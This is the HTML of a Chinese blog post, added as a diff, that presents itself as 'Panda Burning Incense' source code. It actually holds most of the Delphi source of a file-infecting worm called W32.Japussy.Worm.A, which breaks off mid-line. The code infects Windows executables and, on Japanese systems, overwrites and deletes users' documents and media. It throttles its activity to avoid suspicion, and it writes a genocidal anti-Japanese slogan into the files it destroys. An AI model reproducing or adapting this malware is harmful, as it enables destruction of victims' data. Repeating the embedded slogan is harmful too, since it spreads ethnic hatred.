@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Path-Blogs" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="熊猫烧香源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Path-Blogs">
+<meta property="og:url" content="http://yoursite.com/2018/03/05/熊猫烧香源码/index.html">
+<meta property="og:site_name" content="Path-Blogs">
+<meta property="og:description" content="熊猫烧香源码">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-05T06:26:15.380Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Path-Blogs">
+<meta name="twitter:description" content="熊猫烧香源码">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/05/熊猫烧香源码/"/>
+
+
+
+
+
+  <title> | Path-Blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/killvf"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Path-Blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Chen's Blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/05/熊猫烧香源码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Path-Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-05T14:24:23+08:00">
+                2018-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,006
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="熊猫烧香源码"><a href="#熊猫烧香源码" class="headerlink" title="熊猫烧香源码"></a>熊猫烧香源码</h3><hr>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line">代码:--------------------------------------------------------------------------------</span><br><span class="line">program Japussy;</span><br><span class="line">uses</span><br><span class="line">Windows, SysUtils, Classes, Graphics, ShellAPI&#123;, Registry&#125;;</span><br><span class="line">const</span><br><span class="line">HeaderSize = 82432; //病毒体的大小</span><br><span class="line">IconOffset = $12EB8; //PE文件主图标的偏移量</span><br><span class="line"> </span><br><span class="line">//在我的Delphi5 SP1上面编译得到的大小，其它版本的Delphi可能不同</span><br><span class="line">//查找2800000020的十六进制字符串可以找到主图标的偏移量</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">HeaderSize = 38912; //Upx压缩过病毒体的大小</span><br><span class="line">IconOffset = $92BC; //Upx压缩过PE文件主图标的偏移量</span><br><span class="line"> </span><br><span class="line">//Upx 1.24W 用法: upx -9 --8086 Japussy.exe</span><br><span class="line">&#125;</span><br><span class="line">IconSize = $2E8; //PE文件主图标的大小--744字节</span><br><span class="line">IconTail = IconOffset + IconSize; //PE文件主图标的尾部</span><br><span class="line">ID = $44444444; //感染标记</span><br><span class="line"> </span><br><span class="line">//垃圾码，以备写入</span><br><span class="line">Catchword = &apos;If a race need to be killed out, it must be Yamato. &apos; +</span><br><span class="line">&apos;If a country need to be destroyed, it must be Japan! &apos; +</span><br><span class="line">&apos;*** W32.Japussy.Worm.A ***&apos;;</span><br><span class="line">&#123;$R *.RES&#125;</span><br><span class="line">function RegisterServiceProcess(dwProcessID, dwType: Integer): Integer;</span><br><span class="line">stdcall; external &apos;Kernel32.dll&apos;; //函数声明</span><br><span class="line">var</span><br><span class="line">TmpFile: string;</span><br><span class="line">Si: STARTUPINFO;</span><br><span class="line">Pi: PROCESS_INFORMATION;</span><br><span class="line">IsJap: Boolean = False; //日文操作系统标记</span><br><span class="line">&#123; 判断是否为Win9x &#125;</span><br><span class="line">function IsWin9x: Boolean;</span><br><span class="line">var</span><br><span class="line">Ver: TOSVersionInfo;</span><br><span class="line">begin</span><br><span class="line">Result := False;</span><br><span class="line">Ver.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);</span><br><span class="line">if not GetVersionEx(Ver) then</span><br><span class="line">Exit;</span><br><span class="line">if (Ver.dwPlatformID = VER_PLATFORM_WIN32_WINDOWS) then //Win9x</span><br><span class="line">Result := True;</span><br><span class="line">end;</span><br><span class="line">&#123; 在流之间复制 &#125;</span><br><span class="line">procedure CopyStream(Src: TStream; sStartPos: Integer; Dst: TStream;</span><br><span class="line">dStartPos: Integer; Count: Integer);</span><br><span class="line">var</span><br><span class="line">sCurPos, dCurPos: Integer;</span><br><span class="line">begin</span><br><span class="line">sCurPos := Src.Position;</span><br><span class="line">dCurPos := Dst.Position;</span><br><span class="line">Src.Seek(sStartPos, 0);</span><br><span class="line">Dst.Seek(dStartPos, 0);</span><br><span class="line">Dst.CopyFrom(Src, Count);</span><br><span class="line">Src.Seek(sCurPos, 0);</span><br><span class="line">Dst.Seek(dCurPos, 0);</span><br><span class="line">end;</span><br><span class="line">&#123; 将宿主文件从已感染的PE文件中分离出来，以备使用 &#125;</span><br><span class="line">procedure ExtractFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">sStream, dStream: TFileStream;</span><br><span class="line">begin</span><br><span class="line">try</span><br><span class="line">sStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);</span><br><span class="line">try</span><br><span class="line">dStream := TFileStream.Create(FileName, fmCreate);</span><br><span class="line">try</span><br><span class="line">sStream.Seek(HeaderSize, 0); //跳过头部的病毒部分</span><br><span class="line">dStream.CopyFrom(sStream, sStream.Size - HeaderSize);</span><br><span class="line">finally</span><br><span class="line">dStream.Free;</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">sStream.Free;</span><br><span class="line">end;</span><br><span class="line">except</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 填充STARTUPINFO结构 &#125;</span><br><span class="line">procedure FillStartupInfo(var Si: STARTUPINFO; State: Word);</span><br><span class="line">begin</span><br><span class="line">Si.cb := SizeOf(Si);</span><br><span class="line">Si.lpReserved := nil;</span><br><span class="line">Si.lpDesktop := nil;</span><br><span class="line">Si.lpTitle := nil;</span><br><span class="line">Si.dwFlags := STARTF_USESHOWWINDOW;</span><br><span class="line">Si.wShowWindow := State;</span><br><span class="line">Si.cbReserved2 := 0;</span><br><span class="line">Si.lpReserved2 := nil;</span><br><span class="line">end;</span><br><span class="line">&#123; 发带毒邮件 &#125;</span><br><span class="line">procedure SendMail;</span><br><span class="line">begin</span><br><span class="line">//哪位仁兄愿意完成之？</span><br><span class="line">end;</span><br><span class="line">&#123; 感染PE文件 &#125;</span><br><span class="line">procedure InfectOneFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">HdrStream, SrcStream: TFileStream;</span><br><span class="line">IcoStream, DstStream: TMemoryStream;</span><br><span class="line">iID: LongInt;</span><br><span class="line">aIcon: TIcon;</span><br><span class="line">Infected, IsPE: Boolean;</span><br><span class="line">i: Integer;</span><br><span class="line">Buf: array[0..1] of Char;</span><br><span class="line">begin</span><br><span class="line">try //出错则文件正在被使用，退出</span><br><span class="line">if CompareText(FileName, &apos;JAPUSSY.EXE&apos;) = 0 then //是自己则不感染</span><br><span class="line">Exit;</span><br><span class="line">Infected := False;</span><br><span class="line">IsPE := False;</span><br><span class="line">SrcStream := TFileStream.Create(FileName, fmOpenRead);</span><br><span class="line">try</span><br><span class="line">for i := 0 to $108 do //检查PE文件头</span><br><span class="line">begin</span><br><span class="line">SrcStream.Seek(i, soFromBeginning);</span><br><span class="line">SrcStream.Read(Buf, 2);</span><br><span class="line">if (Buf[0] = #80) and (Buf[1] = #69) then //PE标记</span><br><span class="line">begin</span><br><span class="line">IsPE := True; //是PE文件</span><br><span class="line">Break;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">SrcStream.Seek(-4, soFromEnd); //检查感染标记</span><br><span class="line">SrcStream.Read(iID, 4);</span><br><span class="line">if (iID = ID) or (SrcStream.Size &lt; 10240) then //太小的文件不感染</span><br><span class="line">Infected := True;</span><br><span class="line">finally</span><br><span class="line">SrcStream.Free;</span><br><span class="line">end;</span><br><span class="line">if Infected or (not IsPE) then //如果感染过了或不是PE文件则退出</span><br><span class="line">Exit;</span><br><span class="line">IcoStream := TMemoryStream.Create;</span><br><span class="line">DstStream := TMemoryStream.Create;</span><br><span class="line">try</span><br><span class="line">aIcon := TIcon.Create;</span><br><span class="line">try</span><br><span class="line">//得到被感染文件的主图标(744字节)，存入流</span><br><span class="line">aIcon.ReleaseHandle;</span><br><span class="line">aIcon.Handle := ExtractIcon(HInstance, PChar(FileName), 0);</span><br><span class="line">aIcon.SaveToStream(IcoStream);</span><br><span class="line">finally</span><br><span class="line">aIcon.Free;</span><br><span class="line">end;</span><br><span class="line">SrcStream := TFileStream.Create(FileName, fmOpenRead);</span><br><span class="line">//头文件</span><br><span class="line">HdrStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);</span><br><span class="line">try</span><br><span class="line">//写入病毒体主图标之前的数据</span><br><span class="line">CopyStream(HdrStream, 0, DstStream, 0, IconOffset);</span><br><span class="line">//写入目前程序的主图标</span><br><span class="line">CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);</span><br><span class="line">//写入病毒体主图标到病毒体尾部之间的数据</span><br><span class="line">CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);</span><br><span class="line">//写入宿主程序</span><br><span class="line">CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);</span><br><span class="line">//写入已感染的标记</span><br><span class="line">DstStream.Seek(0, 2);</span><br><span class="line">iID := $44444444;</span><br><span class="line">DstStream.Write(iID, 4);</span><br><span class="line">finally</span><br><span class="line">HdrStream.Free;</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">SrcStream.Free;</span><br><span class="line">IcoStream.Free;</span><br><span class="line">DstStream.SaveToFile(FileName); //替换宿主文件</span><br><span class="line">DstStream.Free;</span><br><span class="line">end;</span><br><span class="line">except;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line"> </span><br><span class="line">&#123; 将目标文件写入垃圾码后删除 &#125;</span><br><span class="line">procedure SmashFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">FileHandle: Integer;</span><br><span class="line">i, Size, Mass, Max, Len: Integer;</span><br><span class="line">begin</span><br><span class="line">try</span><br><span class="line">SetFileAttributes(PChar(FileName), 0); //去掉只读属性</span><br><span class="line">FileHandle := FileOpen(FileName, fmOpenWrite); //打开文件</span><br><span class="line">try</span><br><span class="line">Size := GetFileSize(FileHandle, nil); //文件大小</span><br><span class="line">i := 0;</span><br><span class="line">Randomize;</span><br><span class="line">Max := Random(15); //写入垃圾码的随机次数</span><br><span class="line">if Max &lt; 5 then</span><br><span class="line">Max := 5;</span><br><span class="line">Mass := Size div Max; //每个间隔块的大小</span><br><span class="line">Len := Length(Catchword);</span><br><span class="line">while i &lt; Max do</span><br><span class="line">begin</span><br><span class="line">FileSeek(FileHandle, i * Mass, 0); //定位</span><br><span class="line">//写入垃圾码，将文件彻底破坏掉</span><br><span class="line">FileWrite(FileHandle, Catchword, Len);</span><br><span class="line">Inc(i);</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">FileClose(FileHandle); //关闭文件</span><br><span class="line">end;</span><br><span class="line">DeleteFile(PChar(FileName)); //删除之</span><br><span class="line">except</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 获得可写的驱动器列表 &#125;</span><br><span class="line">function GetDrives: string;</span><br><span class="line">var</span><br><span class="line">DiskType: Word;</span><br><span class="line">D: Char;</span><br><span class="line">Str: string;</span><br><span class="line">i: Integer;</span><br><span class="line">begin</span><br><span class="line">for i := 0 to 25 do //遍历26个字母</span><br><span class="line">begin</span><br><span class="line">D := Chr(i + 65);</span><br><span class="line">Str := D + &apos;:&apos;;</span><br><span class="line">DiskType := GetDriveType(PChar(Str));</span><br><span class="line">//得到本地磁盘和网络盘</span><br><span class="line">if (DiskType = DRIVE_FIXED) or (DiskType = DRIVE_REMOTE) then</span><br><span class="line">Result := Result + D;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 遍历目录，感染和摧毁文件 &#125;</span><br><span class="line">procedure LoopFiles(Path, Mask: string);</span><br><span class="line">var</span><br><span class="line">i, Count: Integer;</span><br><span class="line">Fn, Ext: string;</span><br><span class="line">SubDir: TStrings;</span><br><span class="line">SearchRec: TSearchRec;</span><br><span class="line">Msg: TMsg;</span><br><span class="line">function IsValidDir(SearchRec: TSearchRec): Integer;</span><br><span class="line">begin</span><br><span class="line">if (SearchRec.Attr &lt;&gt; 16) and (SearchRec.Name &lt;&gt; &apos;.&apos;) and</span><br><span class="line">(SearchRec.Name &lt;&gt; &apos;..&apos;) then</span><br><span class="line">Result := 0 //不是目录</span><br><span class="line">else if (SearchRec.Attr = 16) and (SearchRec.Name &lt;&gt; &apos;.&apos;) and</span><br><span class="line">(SearchRec.Name &lt;&gt; &apos;..&apos;) then</span><br><span class="line">Result := 1 //不是根目录</span><br><span class="line">else Result := 2; //是根目录</span><br><span class="line">end;</span><br><span class="line">begin</span><br><span class="line">if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then</span><br><span class="line">begin</span><br><span class="line">repeat</span><br><span class="line">PeekMessage(Msg, 0, 0, 0, PM_REMOVE); //调整消息队列，避免引起怀疑</span><br><span class="line">if IsValidDir(SearchRec) = 0 then</span><br><span class="line">begin</span><br><span class="line">Fn := Path + SearchRec.Name;</span><br><span class="line">Ext := UpperCase(ExtractFileExt(Fn));</span><br><span class="line">if (Ext = &apos;.EXE&apos;) or (Ext = &apos;.SCR&apos;) then</span><br><span class="line">begin</span><br><span class="line">InfectOneFile(Fn); //感染可执行文件</span><br><span class="line">end</span><br><span class="line">else if (Ext = &apos;.HTM&apos;) or (Ext = &apos;.HTML&apos;) or (Ext = &apos;.ASP&apos;) then</span><br><span class="line">begin</span><br><span class="line">//感染HTML和ASP文件，将Base64编码后的病毒写入</span><br><span class="line">//感染浏览此网页的所有用户</span><br><span class="line">//哪位大兄弟愿意完成之？</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;.WAB&apos; then //Outlook地址簿文件</span><br><span class="line">begin</span><br><span class="line">//获取Outlook邮件地址</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;.ADC&apos; then //Foxmail地址自动完成文件</span><br><span class="line">begin</span><br><span class="line">//获取Foxmail邮件地址</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;IND&apos; then //Foxmail地址簿文件</span><br><span class="line">begin</span><br><span class="line">//获取Foxmail邮件地址</span><br><span class="line">end</span><br><span class="line">else</span><br><span class="line">begin</span><br><span class="line">if IsJap then //是倭文操作系统</span><br><span class="line">begin</span><br><span class="line">if (Ext = &apos;.DOC&apos;) or (Ext = &apos;.XLS&apos;) or (Ext = &apos;.MDB&apos;) or</span><br><span class="line">(Ext = &apos;.MP3&apos;) or (Ext = &apos;.RM&apos;) or (Ext = &apos;.RA&apos;) or</span><br><span class="line">(Ext = &apos;.WMA&apos;) or (Ext = &apos;.ZIP&apos;) or (Ext = &apos;.RAR&apos;) or</span><br><span class="line">(Ext = &apos;.MPEG&apos;) or (Ext = &apos;.ASF&apos;) or (Ext = &apos;.JPG&apos;) or</span><br><span class="line">(Ext = &apos;.JPEG&apos;) or (Ext = &apos;.GIF&apos;) or (Ext = &apos;.SWF&apos;) or</span><br><span class="line">(Ext = &apos;.PDF&apos;) or (Ext = &apos;.CHM&apos;) or (Ext = &apos;.AVI&apos;) then</span><br><span class="line">SmashFile(Fn); //摧毁文件</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">//感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑</span><br><span class="line">Sleep(200);</span><br><span class="line">until (FindNext(SearchRec) &lt;&gt; 0);</span><br><span class="line">end;</span><br><span class="line">FindClose(SearchRec);</span><br><span class="line">SubDir := TStringList.Create;</span><br><span class="line">if (FindFirst(Path + &apos;*.*&apos;, faDirectory, SearchRec) = 0) then</span><br><span class="line">begin</span><br><span class="line">repeat</span><br><span class="line">if IsValidDir(SearchRec) = 1 then</span><br><span class="line">SubDir.Add(SearchRec.Name);</span><br><span class="line">until (FindNext(SearchRec) &lt;&gt; 0);</span><br><span class="line">end;</span><br><span class="line">FindClose(SearchRec);</span><br><span class="line">Count := SubDir.Count - 1;</span><br><span class="line">for i := 0 to Count do</span><br><span class="line">LoopFiles(Path + SubDir.Strings + &apos;&apos;, Mask);</span><br><span class="line">FreeAndNil(SubDir);</span><br><span class="line">end;</span><br><span class="line">&#123; 遍历磁盘上所有的文件 &#125;</span><br><span class="line">procedure InfectFiles;</span><br><span class="line"> </span><br><span class="line">var</span><br><span class="line">DriverList: string;</span><br><span class="line">i, Len: Integer;</span><br><span 